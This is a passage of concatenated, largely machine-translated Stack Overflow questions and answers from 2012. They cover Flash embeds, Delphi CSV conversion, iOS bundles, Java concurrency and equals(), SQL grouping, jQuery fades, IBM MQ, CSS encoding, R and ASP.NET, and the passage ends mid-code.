> 时间：2012-09-17T13:25:48.457
> 
> 标签：css, flash, google-chrome, background, embed

一张图片值一千字，所以我将从它开始

[![嵌入标签周围的白色背景](../Images/23ff060ca06c8d8108fb677163160ef7.png)](https://i.stack.imgur.com/mPVa8.png)

如您所见，Chrome 中出现白色背景，而在 Firefox 中，这部电影非常适合。

这是嵌入代码：

```
<embed id="movie" src="movie.swf" loop="false" menu="false" quality="best" 
bgcolor="#ffffff" width="250" height="250" scale="aspect" name="movie" 
align="middle" allowscriptaccess="always" allowfullscreen="false" 
type="application/x-shockwave-flash" 
pluginspage="http://www.macromedia.com/go/getflashplayer" 
flashvars="shutter_enabled=1&amp;shutter_url=shutter.mp3&amp;width=250&amp;
height=250&amp;server_width=250&amp;server_height=250"> 
```

目前，我习惯`bgcolor=#e0efe8`将它与背景合并。但我很好奇的是，为什么这部电影不像在 Firefox 中那样完美契合？

我试图查看 css，但右键单击它会显示 flash 设置菜单。embed 标签是 withing a`td`和`table`has `cellspacing = "4"`and `cellpadding = "3"`，但我认为这不会导致问题。table、tr 或 td 没有定义 height 属性，所以我想我们也可以在“to check”列表中勾选它。

我这边是否还有其他需要提供的解决方案？

**更新**

如果有帮助，也可以加入 HTML：

```
<table width="100%">
    <tbody>
        <tr>
            <td>
                <embed id="movie" src="movie.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" scale="aspect" name="movie" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="shutter_enabled=1&amp;shutter_url=shutter.mp3&amp;width=250&amp;height=250&amp;server_width=250&amp;server_height=250" align="middle" height="250" width="250">
             </td>   
        </tr>
    </tbody>
</table> 
```

最后设法通过 Firebug lite 查看 CSS。这是SS：

![CSS](../Images/96849ad3fe44bddb98bc8fde9f1046b6.png)

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:39:31.063

我们需要查看您的 CSS 文件或内联样式代码，您是否尝试将 td 填充属性设置为零？

CSS 代码：

```
td {
    padding: 0;
} 
```

Edit1：如果这不起作用，也许是这个 css 属性：

```
border-collapse: collapse 
```

Edit2：尝试使用这些 CSS 属性：

```
position: relative;
overflow: auto; 
```

来源（其他人有类似问题）：[http ://productforums.google.com/forum/#!topic/chrome/2EqmQiwApz4](http://productforums.google.com/forum/#!topic/chrome/2EqmQiwApz4)

# delphi - Parsing a flat text file

> ID：12460210
> 
> 赞同：3
> 
> 时间：2012-09-17T13:25:48.210
> 
> 标签：delphi

I am developing an application and I have to upload data from CSV files into a DB tables. Problem is, I don’t have CSV files but I have flat text files to be converted into CSV. An additional problem is, as the application is used by several customers who have different systems, I have different flat text files with different layouts.

What I want to achieve is to create an application that loads “rules” from a special file; these rules will be processed with the flat text file in order generate the CSV file. The application that converts from flat file to CSV would be the same, just the set of rules would be different.

How can I achieve this? What is the best practice you recommend?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:05:47.300

这取决于规则的复杂性。如果唯一不同的输入是列的名称和使用的分隔符，那么这很容易，但如果您还希望能够解析完全不同的格式（如 XML 等），那就另当别论了。

我自己会选择为“记录”阅读器实现一个基类，该阅读器从文件中读取记录并将它们输出到数据集或 CSV。然后，您可以实现实现读取不同源格式的子类。

如果你愿意，你可以为这些格式添加特定的规则，这样你就可以创建一个从 BaseReader 继承的通用 XMLReader，但它允许可配置的列名。但是我会从一堆硬编码的阅读器开始，直到你更清楚你可能会遇到这些格式的哪些方言。

编辑：根据要求，它的外观示例。

注意，这个例子远非理想！它读取自定义格式，将其传输到一个特定的表结构并将其保存为 CSV 文件。您可能希望进一步拆分它，以便可以将代码重用于不同的表结构。尤其是字段 defs，您可能希望能够在后代类或工厂类中进行设置。但是为了简单起见，我采取了一种更严格的方法，并在一个基类中加入了太多的智能。

基类具有创建内存数据集所需的逻辑（我使用了 TClientDataSet）。它可以“迁移”文件。实际上，这意味着它读取、验证和导出文件。

阅读是抽象的，必须在子类中实现。它应该将数据读取到内存数据集中。这允许您在客户端数据集中进行所有必要的验证。这允许您以与数据库/文件格式无关的方式强制执行字段类型和大小，并在需要时进行任何其他检查。

验证和写入是使用数据集中的数据完成的。从源文件被解析为数据集的那一刻起，不再需要关于源文件格式的知识。

声明：不要忘记使用`DB, DBClient`.

```
type
  TBaseMigrator = class
  private
    FData: TClientDataset;
  protected
    function CSVEscape(Str: string): string;
    procedure ReadFile(AFileName: string); virtual; abstract;
    procedure ValidateData;
    procedure SaveData(AFileName: string);
  public
    constructor Create; virtual;
    destructor Destroy; override;

    procedure MigrateFile(ASourceFileName, ADestFileName: string); virtual;
  end; 
```

执行：

```
{ TBaseReader }

constructor TBaseMigrator.Create;
begin
  inherited Create;
  FData := TClientDataSet.Create(nil);
  FData.FieldDefs.Add('ID', ftString, 20, True);
  FData.FieldDefs.Add('Name', ftString, 60, True);
  FData.FieldDefs.Add('Phone', ftString, 15, False);
  // Etc
end;

function TBaseMigrator.CSVEscape(Str: string): string;
begin
  // Escape the string to a CSV-safe format;
  // Todo: Check if this is sufficient!
  Result := '"' + StringReplace(Result, '"', '""', [rfReplaceAll]) + '"';
end;

destructor TBaseMigrator.Destroy;
begin
  FData.Free;
  inherited;
end;

procedure TBaseMigrator.MigrateFile(ASourceFileName, ADestFileName: string);
begin
  // Read the file. Descendant classes need to override this method.
  ReadFile(ASourceFileName);

  // Validation. Implemented in base class.
  ValidateData;

  // Saving/exporting. For now implemented in base class.
  SaveData(ADestFileName);
end;

procedure TBaseMigrator.SaveData(AFileName: string);
var
  Output: TFileStream;
  Writer: TStreamWriter;
  FieldIndex: Integer;
begin
  Output := TFileStream.Create(AFileName,fmCreate);
  Writer := TStreamWriter.Create(Output);
  try

    // Write the CSV headers based on the fields in the dataset
    for FieldIndex := 0 to FData.FieldCount - 1 do
    begin
      if FieldIndex > 0 then
        Writer.Write(',');
      // Column headers are escaped, but this may not be needed, since
      // they likely don't contain quotes, commas or line breaks.
      Writer.Write(CSVEscape(FData.Fields[FieldIndex].FieldName));
    end;
    Writer.WriteLine;

    // Write each row
    FData.First;
    while not FData.Eof do
    begin

      for FieldIndex := 0 to FData.FieldCount - 1 do
      begin
        if FieldIndex > 0 then
          Writer.Write(',');
        // Escape each value
        Writer.Write(CSVEscape(FData.Fields[FieldIndex].AsString));
      end;
      Writer.WriteLine;

      FData.Next
    end;

  finally
    Writer.Free;
    Output.Free;
  end;
end;

procedure TBaseMigrator.ValidateData;
begin
  FData.First;
  while not FData.Eof do
  begin
    // Validate the current row of FData
    FData.Next
  end;
end; 
```

一个示例子类：TINiFileReader，它读取 inifile 部分，就好像它们是数据库记录一样。如您所见，您只需要实现读取文件的逻辑即可。

```
type
  TIniFileReader = class(TBaseMigrator)
  public
    procedure ReadFile(AFileName: string); override;
  end;

{ TIniFileReader }

procedure TIniFileReader.ReadFile(AFileName: string);
var
  Source: TMemIniFile;
  IDs: TStringList;
  ID: string;
  i: Integer;
begin
  // Initialize an in-memory dataset.
  FData.Close; // Be able to migrate multiple files with one instance.
  FData.CreateDataSet;

  // Parsing a weird custom format, where each section in an inifile is a
  // row. Section name is the key, section contains the other fields.
  Source := TMemIniFile.Create(AFileName);
  IDs := TStringList.Create;
  try
    Source.ReadSections(IDs);

    for i := 0 to IDs.Count - 1 do
    begin
      // The section name is the key/ID.
      ID := IDs[i];

      // Append a row.
      FData.Append;

      // Read the values.
      FData['ID'] := ID;
      FData['Name'] := Source.ReadString(ID, 'Name', '');
      // Names don't need to match. The field 'telephone' in this propriety
      // format maps to 'phone' in your CSV output.
      // Later, you can make this customizable (configurable) if you need to,
      // but it's unlikely that you encounter two different inifile-based
      // formats, so it's a waste to implement that until you need it.
      FData['Phone'] := Source.ReadString(ID, 'Telephone', '');

      FData.Post;
    end;

  finally
    IDs.Free;
    Source.Free;
  end;
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T18:05:59.153

这与“屏幕刮板”面临的问题非常相似。如果最终用户打算能够使用它，我会避免使用正则表达式（如果需要，作为内部实现细节除外），并且不会将原始正则表达式编辑暴露给最终用户。

相反，我会让他们加载数据文件的样本，并通过拖放样式直观地构建规则。

1.  单击“匹配文本”按钮，单击并拖动以选择屏幕上的矩形区域。如果格式不精确或不可重复，则可以选择允许向上或向下或向左或向右移动一定量。限制您可以超出原始框的距离。

2.  单击“抓取文本”按钮，单击并拖动到屏幕上的矩形或非矩形（流动）区域。用一个字段命名输出，并给它一个类型（整数、字符串 [x] 等）。类似的限制适用于第 1 步。

3.  单击保存，模板规则将写入磁盘。加载一个不同的文件，看看规则是否仍然适用。

[相关的维基百科主题。](http://en.wikipedia.org/wiki/Data_scraping)

# iphone - iPhone 应用程序支持文件夹包含构建前的文件

> ID：12460211
> 
> 赞同：3
> 
> 时间：2012-09-17T13:25:49.487
> 
> 标签：iphone, ios, file, directory

我有一个 iPhone 应用程序，它以编程方式获取应用程序支持文件夹的路径，测试应用程序支持文件夹中的文件，然后根据结果加载文件或创建新文件。这很容易，并且有很多关于如何做到这一点的教程。

但是在构建应用程序之前，我无法在 ios 文档或在线找到任何关于如何将文件放入应用程序支持文件夹的内容。我尝试在我的应用程序 Xcode 文件夹中创建库/应用程序支持无济于事。

具体来说，我正在制作一个游戏，我想在构建和运行应用程序之前将关卡包包含在游戏的 Library/Application Support 文件夹中。最好通过在 Finder 中拖放文件。这可能吗？

@Vimal Venugopalan

**编辑**：正如 Vimal 提到的，我可以使用 [[NSBundle mainBundle] pathForResource:ofType:inDirectory:] 方法，但这给出了类似于“~/MyApp.app/MyFolder/MyFile.plist”的路径。也就是说，如果“~”是应用程序主目录的路径。或者更具体地说，“~”是调用 NSHomeDirectory() 返回的路径；功能。我想把文件放在“~/Library/Application Support/MyFolder/MyFile.plist”中

我想要这个位置的文件，因为我想将关卡包合并到我的游戏中。我想在应用程序下载中包含一些关卡包，我最终希望有额外的可下载关卡包。现在下载的关卡包肯定必须放在“~/Library/Application Support/”文件夹中（我知道如何以编程方式进行），所以我想在构建和运行之前将原始关卡包包含在同一个地方应用程序。将我所有的关卡包放在一个地方会简单得多！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:37:19.097

您可以在项目中添加这些文件并在运行时访问这些文件，Xcode 将在 Copy Bundle Resource 阶段复制它们。这通常会复制到包的根目录中。要处理目录，请参阅@CocoaFu 对[这个 SO question](https://stackoverflow.com/questions/1401338/include-a-resource-directory-hierarchy-into-app-bundle)的回答。

然后在代码中

`NSBundle* bundle = [NSBundle mainBundle]`会给你主要的捆绑

从这里您可以使用 pathForResource:ofType:inDirectory 查看目录：例如

```
NSString* path = [bundle pathForResource:@"file.xml" 
                                  ofType:nil 
                             inDirectory:@"a"]; 
```

这些方法在[NSBundle 类参考](http://developer.apple.com/library/iOS/#documentation/Cocoa/Reference/Foundation/Classes/NSBundle_Class/Reference/Reference.html)中给出，另请参见[Bundle Programming guide](http://developer.apple.com/library/iOS/#documentation/CoreFoundation/Conceptual/CFBundles/Introduction/Introduction.html#//apple_ref/doc/uid/10000123i)

希望这可以解决您的问题。如果不是请评论

# java - Block EDT till executorservice completes all task

> ID：12460214
> 
> 赞同：1
> 
> 时间：2012-09-17T13:26:03.027
> 
> 标签：java, multithreading, ui-thread

In my application i have two jtextpanes and i have a executorservice instacne which contains few task. I want to assure that all the task in the executorservice instance are completed before executing the FocusListener focusGained method of any jtextpanes. Also i add some more task to the executorservice when focusLost method is called.

Code

```
top.addFocusListener(new FocusListener()
{

  public void focusLost(FocusEvent e)
  {

    if (ecaViewControl.isInitialized())
    {
      stopRecording();
      executor.execute(new Runnable()
      {

        public void run()
        {
          ecaViewControl.save(top);

        }
      });

      executor.execute(new Runnable()
      {
        public void run()
        {
          ecaViewControl.closeDocument();

        }
      });

   }

  }

   public void focusGained(FocusEvent e)
   {
   //Need to have completed all the task in executor service before EDT executes the code in here

   });

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:46:19.780

如果您确实知道要完成的任务数，请考虑使用[CountDownLatch](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/CountDownLatch.html)

所以你的代码可能看起来像：

```
public void run() {
    try {
    // do something here
    } finally {
       latch.countDown()
    }
} 
```

然后在您等待任务完成的代码中 - 只需等待闩锁：

```
latch.await(); 
```

或者，如果您可能没有执行人，请改用[CompletionService 。](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/CompletionService.html)

# java - 使用 .equals() 进行字符串比较在 Java 中不起作用。

> ID：12460215
> 
> 赞同：5
> 
> 时间：2012-09-17T13:26:07.443
> 
> 标签：java, string-comparison

当比较从控制台输入获取的字符串与数组中的字符串时，`false`除非我添加`.toString()`. 两个字符串是相等的，它应该可以在不添加`.toString()`. 谁能帮我弄清楚为什么？

在这里，我得到了我想从控制台比较的字符串：

```
System.out.println("\nEnter the name you wish to remove from the list.");
String name = in.nextLine();
System.out.println("\n\"" + myNameList.remove(new MyOrderedList(name)) + "\"" + " removed from the name list\n"); 
```

这是删除方法：

```
public T remove(T element) {
    T result;
    int index = find(element);

    if (index == NOT_FOUND) {
        throw new ElementNotFoundException("list");
    }

    result = list[index];
    rear--;

    /** shift the appropriate elements */
    for (int scan = index; scan < rear; scan++) {
        list[scan] = list[scan+1];
    }

    list[rear] = null;
    return result;
} 
```

这是问题所在的查找方法：

```
private int find(T target) {
    int scan = 0, result = NOT_FOUND;
    boolean found = false;

    if (!isEmpty()) {
        while (!found && scan < rear) {
            if (target.equals(list[scan])) { // Not sure why this does not work until I add the .toString()s
                found = true;
            }
            else {
                scan++;
            }
        }
    }

    if (found) {
        result = scan;
    }
    return result;
} 
```

除非我将其`if (target.equals(list[scan]))`更改为.`false``if (target.toString().equals(list[scan].toString())`

我使用 an`ArrayList`来表示列表的数组实现。列表的前面保留在数组索引 0 处。如果有帮助，可以扩展此类以创建特定类型的列表。如果需要，我可以发布所有课程。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:29:54.343

如果第一个参数是字符串，则仅使用 String.equals。

> 使用 .equals() 进行字符串比较不起作用 java

看来这是行之有效的事情。它的 T.equals() 不起作用。

* * *

如果你有这个工作，这意味着你已经`toString()`明智地覆盖了。

```
target.toString().equals(list[scan].toString() 
```

但如果这不起作用

```
target.equals(list[scan]) 
```

这意味着您没有`equals(Object)`正确覆盖。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:30:20.077

如果`myNameList`有一个`String`泛型参数，那么这将不起作用，因为 no`String`将等于`MyOrderedList`.

如果`myNameList`有一个`MyOrderedList`泛型参数，那么您需要确保`equals()`为它定义一个方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T16:41:21.113

尼古拉斯和彼得是正确的。我需要覆盖 equals() 方法。我尝试了一些事情，还让 Eclipse 生成 hashCode() 和 equals() 来看看会发生什么以及它现在在没有 .toString() 的情况下工作

这是 Eclipse 为我生成的内容：

```
 /* (non-Javadoc)
 * @see java.lang.Object#hashCode()
 */
@Override
public int hashCode() {
    final int prime = 31;
    int result = 1;
    result = prime * result + ((myList == null) ? 0 : myList.hashCode());
    return result;
}

/* (non-Javadoc)
 * @see java.lang.Object#equals(java.lang.Object)
 */
@Override
public boolean equals(Object obj) {
    if (this == obj) {
        return true;
    }
    if (obj == null) {
        return false;
    }
    if (!(obj instanceof MyOrderedList)) {
        return false;
    }
    MyOrderedList other = (MyOrderedList) obj;
    if (myList == null) {
        if (other.myList != null) {
            return false;
        }
    } else if (!myList.equals(other.myList)) {
        return false;
    }
    return true;
} 
```

我真的很感谢大家这么快的反应。我对java相当陌生，所以当我遇到问题时，我在这里阅读了很多帖子，我总是在这里找到答案。谢谢大家！

# sql - 涉及 group by 和 joins 的 SQL 查询

> ID：12460225
> 
> 赞同：4
> 
> 时间：2012-09-17T13:26:23.857
> 
> 标签：sql, sql-server-2008, tsql

我不能在标题部分更具体，但我想为我做一些有点复杂的事情。我以为我做到了，但结果证明它是错误的。

我有以下三个表：

项目表

*   idProject
*   标题
*   idOwner

报价表

*   idOffer
*   idProject
*   身份证号

帐户表

*   身份证号
*   用户名

现在在一个查询中，我的目标是列出所有提供最多报价的项目，并且在查询中我还想获取所有者的~~用户名、提供者的用户名*~~等详细信息。所以我不必再次查询每个项目。

这是我损坏的查询，这是我对 GROUP BY 的第一次实验，我可能不太明白。

```
SELECT Project.addDate,Project.idOwner ,Account.Username,Project.idProject,
    Project.Price,COUNT(Project.idProject) as offercount 
FROM Project 
INNER JOIN Offer 
    ON Project.idProject= Offer.idProject 
INNER JOIN Account 
ON Account.idAccount = Project.idOwner  
GROUP BY Project.addDate,Project.idOwner,
    Account.Username,Project.idProject,Project.Price 
ORDER BY addDate DESC 
```

*：我写的时候没想到我只是想提供一些额外的信息示例，感谢 Hosam Aly，这是毫无意义的。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T13:33:49.103

试试这个（针对没有报价的项目修改）：

```
SELECT
  Project.addDate,
  Project.idOwner,
  Account.Username,
  Project.idProject,
  Project.Price,
  ISNULL(q.offercount, 0) AS offercount
FROM
  (
    SELECT
      o.idProject,
      COUNT(o.idProject) as offercount
    FROM Offer o
    GROUP BY o.idProject
  ) AS q
  RIGHT JOIN Project ON Project.idProject = q.idProject
  INNER JOIN Account ON Account.idAccount = Project.idOwner
ORDER BY addDate DESC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:33:13.507

我可能会将查询稍微切换为：

```
select p.addDate,
  p.idOwner,
  a.Username,
  p.idProject,
  p.price,
  o.OfferCount
from project p
left join
(
  select count(*) OfferCount, idproject
  from offer
  group by idproject
) o
  on p.idproject = o.idproject
left join account a
  on p.idowner = a.idaccount 
```

通过这种方式，您得到的`count`不是`projectid`基于您分组所依据的所有其他字段。`LEFT JOIN`如果其他表中不存在该或其他 id，我也会使用 a `projectid`，您仍将返回数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:40:56.183

你的问题有点含糊，但这里有一些指示：

*   要列出“提供最多报价”的项目，`ORDER BY offercount`.
*   您实际上是在查询项目，因此您应该`GROUP BY Project.idProject`首先在其他字段之前。
*   您正在查询每个项目的报价数量，但您询问报价详细信息。一起请求这两条信息真的没有意义（语法方面）。如果您想获得在结果的每条记录中重复的报价总数以及报价信息，则必须为此使用内部查询。

`FROM`可以按照其他答案的建议在子句中进行内部查询，也可以直接在`SELECT`子句中进行内部查询，如下所示：

```
SELECT Project.idProject,
       (SELECT COUNT(Offer.idOffer)
          FROM Offer
         WHERE Offer.idProject = Project.idProject
        ) AS OfferCount
  FROM Project 
```

# jquery - 无法使用 jquery 让我的图像以正确的顺序淡出

> ID：12460229
> 
> 赞同：0
> 
> 时间：2012-09-17T13:26:27.980
> 
> 标签：jquery, fade

请看看我到目前为止所做的事情（在这里的好人有一点帮助！）

[http://www.justthisdesign.co.uk/](http://www.justthisdesign.co.uk/)

我有三个横幅图像淡入淡出，然后是左栏中的两个，最后是右栏中的一个。

但是，客户希望单词“Projects”首先淡入，然后是左栏中的每个图像，然后是“and”，然后是“Properties”，然后是右栏中的图像。

我可以通过更改三个 div 中的每一个中的 .delay() 值来获得正确的序列，但节奏不可能正确。

我应该完全使用不同的技术来获得更多的控制权吗？显然，客户不知道这个“简单请求”涉及多少工作！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:34:26.830

给每个元素一个 id，包括持有横幅的标签，然后使用 fadeTo 的回调函数一次调用每个元素一次，在前一个元素完成后，类似于

```
$('#banner1').fadeTo(1000,1,function(){
  $('#banner2').fadeTo(1000,1,function(){
    $('#banner3').fadeTo(1000,1,function(){
    });
  });
}); 
```

根据[http://api.jquery.com/fadeTo/](http://api.jquery.com/fadeTo/)的语法是

```
.fadeTo( duration, opacity [, callback] ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:35:22.083

我建议在文档加载后触发淡入。在第一个动画完成后触发下一个动画

例子

```
$(document).ready(function(){
     $('#project_banner').fadeIn('slow', function(){
        //This is called after fade in 
        $('#project_and_banner').fadeIn('slow',function(){
           // And so on
        });   
     });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:34:54.147

可以指定回调，这个回调函数会在函数完成工作时被调用

```
 $('#one').fadeIn('slow', function() {
     $('#two').fadeIn('slow',function(){
             $('#three').fadeIn();
       });
  }); 
```

这里首先它会淡入#one，然后是#two，然后是#three

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:53:44.707

试试这个**[演示](http://jsbin.com/iwoxal/6)**

[演示代码](http://jsbin.com/iwoxal/6/edit)

这是它的简单 jQuery

```
var mySequence=["one","two","three","four","five","six"];
$.each(mySequence,function(i){
  $("." + mySequence[i]).delay(1000*i).fadeTo(1000,1);
}); 
```

# .net - Can anyone explain me why there's no WeakDelegate in .NET?

> ID：12460231
> 
> 赞同：2
> 
> 时间：2012-09-17T13:26:37.843
> 
> 标签：.net, weak-references, weak-events

I see no architectural constraints for implementing this entity. .NET 4.5 does not have it, and WeakEventManager is still in the game.

I don't think guys in MS are lazy or stupid, so I suspect myself missing something very important. But what?...

# ibm-mq - MQ 扩展事务客户端

> ID：12460236
> 
> 赞同：4
> 
> 时间：2012-09-17T13:26:52.297
> 
> 标签：ibm-mq

默认情况下是否安装了扩展事务客户端？如何验证是否已安装？我如何安装这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:37:24.460

在以前版本的 MQ 客户端中，它当然不包含在标准客户端中（事务客户端具有成本/许可影响）。

然而，从 WMQ v7.5 发布之日起，它现在包含在 v7.0.1 及更高版本的标准客户端中。

来自[IBM Websphere 站点](http://www-01.ibm.com/software/integration/wmq/clients/)

> 随着 WebSphere MQ V7.5 的推出，以前在扩展事务客户端中提供的功能被合并到标准 WebSphere MQ 客户端中。

更详细地说，[这里](http://www-01.ibm.com/common/ssi/ShowDoc.wss?docURL=/common/ssi/rep_ca/1/897/ENUS212-091/index.html&lang=en&request_locale=en)

> 所有客户对扩展事务客户端的更广泛访问 扩展事务客户端使客户能够配置他们的 WebSphere MQ 客户端，以便在与 MQ 服务器交换消息时参与事务工作单元。此客户端的免费使用以前仅限于使用 WebSphere Application Server、WebSphere Enterprise Service Bus 或 WebSphere Process Server 作为事务管理器的客户。随着 WebSphere MQ V7.5 的发布，Extended Transactional Client 可用于所有客户端部署，无需额外授权。这包括连接到任何受支持版本的 WebSphere MQ 队列管理器的所有受支持版本的 WebSphere MQ 客户端。
> 
> 随着 WebSphere MQ V7.5 的推出，以前在扩展事务客户端中提供的功能被合并到标准 WebSphere MQ 客户端中。自本公告发布之日起，使用 WebSphere MQ V7.0.1 和 WebSphere MQ V7.1 的客户可以免费使用 Extended Transactional Client。IBM 正在提供更新的代码，包括更新的许可信息。客户可以通过下载和接受这一新的许可信息来实现这一好处。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:37:45.663

XTC 组件过去与队列管理器一起单独提供，并且需要许可证和单独的安装步骤。截至今年，它是免费的并内置在客户端中。所有客户端软件下载都已使用 XTC 功能进行了更新，不再有单独的组件。要获得它，只需下载并安装最新的客户端。建议尽可能使用 v7.5 客户端，但 v7.0 及更高版本的所有内容都可用并受支持。

*   V7.0 - [SupportPac MQC7](http://ibm.co/SupptPacMQC7)
*   V7.1 - [SupportPac MQC71](http://ibm.co/SupptPacMQC71)
*   V7.5 - [SupportPac MQC75](http://ibm.co/SupptPacMQC75)

# html - 特定的 div css 属性

> ID：12460240
> 
> 赞同：1
> 
> 时间：2012-09-17T13:20:41.280
> 
> 标签：html, css, ftp

我有一个 div :`<div id="fancyboxID-1"> <p>0767380042</p> </div>` 和这个 css:

`​ #fancyboxID-1 p { font-size:150px; text-align: center; line-height:150px; overflow:hidden;}`

上传并刷新网站后，我看不到任何更改，但如果我检查源代码：我看到了 css 属性。

这对我来说很奇怪，我尝试在另一台服务器上上传并且它在那里工作。任何想法为什么这不起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T22:59:17.677

查看您的样式表（style.css），在有问题的行之前似乎有一些奇怪的字符（损坏/ unicode？），这可能会使您的样式表无效。删除这些字符会导致您的风格突然变得栩栩如生……

当使用 ISO-8859-1 编码查看时，它们显示为 4 个可见字符，但如果查看为 UTF-8，它看起来就像一个空格（尽管它不是一个空格）：

```
â€‹ #fancyboxID-1 p { font-size:150px; ... 
```

（顺便说一句，id/类名中的连字符是完全有效的。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:20:03.340

是否有任何其他样式\表格可以覆盖这些更改？您说它可以在其他服务器上运行，因此您托管的服务器必须有一些特定的东西。

如果您使用开发人员工具（IE 或 Chrome 中的 F12，FireFox 中的 Firebug），您可以浏览以查看更改是否实际应用.. 存在的代码仅表示这些样式可用，但其他东西可能会针对该样式执行不同的规则div、p 等

# r - 访问刚刚创建的变量

> ID：12460241
> 
> 赞同：2
> 
> 时间：2012-09-17T13:27:13.013
> 
> 标签：r

> **可能重复：**
> [当变量名作为字符串传递时如何获取值](https://stackoverflow.com/questions/10429829/how-to-get-value-when-a-variable-name-is-passed-as-a-string)

所以我使用 assign() 创建一个变量

```
nam <- "act01"
assign(nam, read.table(text.txt, sep = ", ", header = T)) 
```

我正在尝试将刚刚创建的 act01 变量附加到另一个列表中

```
acts = list()
acts[[1]] <- nam  # something wrong here, I can't find a way to retrieve the variable 
```

是否有任何函数允许您将字符串转换为 R 中的变量？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:42:58.953

太多的工作; 写吧

```
list()->acts
acts[[1]]<-read.table(text.txt, sep = ", ", header = T) 
```

或更好

```
acts<-lapply(text.txts,read.table,sep=', ',header=T) 
```

where`text.txts`是您的文件的向量，例如由`list.files()`.

# java - （问）java文件中的异或计算问题

> ID：12460245
> 
> 赞同：0
> 
> 时间：2012-09-17T13:27:18.470
> 
> 标签：java, xor, fileinputstream, fileoutputstream, parity

我想在我的代码中执行 XOR 操作。但是我在输出上有奇怪的行为。有时结果是正确的，但有时不是。情况是这样的：我有一个已经分成两部分的文件，然后我在两个文件（源文件）上使用 xor 操作创建了一个奇偶校验文件。所以现在我有三个文件。然后我删除了其中一个源文件。我想在奇偶校验文件和关于丢失文件的剩余源文件之间的异或操作中检索丢失的文件。我正在使用哈希函数来检查输出是否正确。如果该函数只被调用一次，一切都很好，但是每当我有很多操作来检索其他文件上丢失的文件时，有时我的函数会产生错误的结果。当他们产生错误的结果时，它' s 总是生成相同的文件。但是，如果我将 thread.sleep 放置 1 秒，即使我有超过 1000 次操作，它们也总是会生成正确的结果。

有人可以帮我找出我的代码的哪一部分被破坏了吗？

```
private byte[] parityByte(byte[] firstByte, byte[] secondByte) {
    int size1;
    size1 = firstByte.length;

    int size2; 
    size2 = secondByte.length;

    byte[] parity;
    parity = new byte[size1];
    for (int i = 0; i < size2; i++) {
        parity[i] = (byte) (firstByte[i] ^ secondByte[i]);
    }
    for (int i = size2; i < size1; i++) {
        parity[i] = firstByte[i];
    }
    return parity;
}

/**
 * get original chunks
 */
public Chunk getOriginal(Chunk parity, Chunk compare, String orig) throws FileNotFoundException, IOException {

    File par = new File(parity.getHash());

    InputStream parity = new BufferedInputStream(new FileInputStream(parity.getHash()));

    InputStream source = new BufferedInputStream(new FileInputStream(compare.getHash()));

    int size = (int) par.length();

    int bufferSize = size;
    byte[] firstBuffer = new byte[size];
    byte[] secondBuffer = new byte[size];

    long remainSize;
    byte[] destByte = new byte[1];
    parity.read(destByte, 0, 1);
    Integer dest = new Integer(destByte[0]);
    remainSize = size - 1 - dest;

    OutputStream originalChunk;
    originalChunk = new FileOutputStream(orig);

    while (remainSize > 0) {
        if (remainSize > bufferSize) {
            remainSize -= bufferSize;
        } else {
            bufferSize = (int) remainSize;
            firstBuffer = new byte[bufferSize];
            secondBuffer = new byte[bufferSize];
            remainSize = 0;
        }
        parity.read(firstBuffer, 0, bufferSize);
        source.read(secondBuffer, 0, bufferSize);
        originalChunk.write(parityByte(firstBuffer, secondBuffer));

    }
    originalChunk.flush();
    parity.close();
    source.close();
    originalChunk.close();

    Chunk tempChunk = Chunk.newChunk(orig);
    return tempChunk;
} 
```

谢谢你对我糟糕的英语感到抱歉。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T22:59:47.063

您假设所有读取都填满了缓冲区。检查Javadoc。read(byte[] ...) 方法返回一个值，这是有原因的。

查看 DataInputStream.readFully() 以获得简单的解决方案。

# jquery - 为什么我不能在类的更新面板页面中显示 js 错误警报？

> ID：12460248
> 
> 赞同：0
> 
> 时间：2012-09-17T13:27:25.260
> 
> 标签：jquery, asp.net, updatepanel

我有一个单选按钮（在更新面板中），在 checkchanged 事件中我正在向用户显示一条消息。但是div在masterpage中并且页面没有呈现，这就是我无法显示消息的原因。有可能解决这个问题吗？顺便说一句，我正在使用类来显示消息。这是我的代码。

```
public static void setError(System.Web.UI.Page p, string title, string error, string type)
    {
        Literal literal = p.Master.FindControl("ltMessage") as Literal;

        if (type == "error")
        {
            literal.Text = "<div id=\"alertError\" style=\"display:none; color:#fff; text-align:center; padding: 8px 10px 9px; width:auto; position:relative; background:#cc0000;\"><h3>" + title + "</h3><p>" + error + "</p></div>";
            //literal.Text = "<div id=\"alert\" class=\"error message\"><h3>" + title + "</h3><p>" + error + "</p></div>";

            StringBuilder sb = new StringBuilder();
            sb.Append("$(function() { ");
            sb.Append(" $('#alertError').toggle({");
            sb.Append("    width: 400");
            sb.Append(" });");
            sb.Append("});");

            if (HttpContext.Current.CurrentHandler is Page)
            {
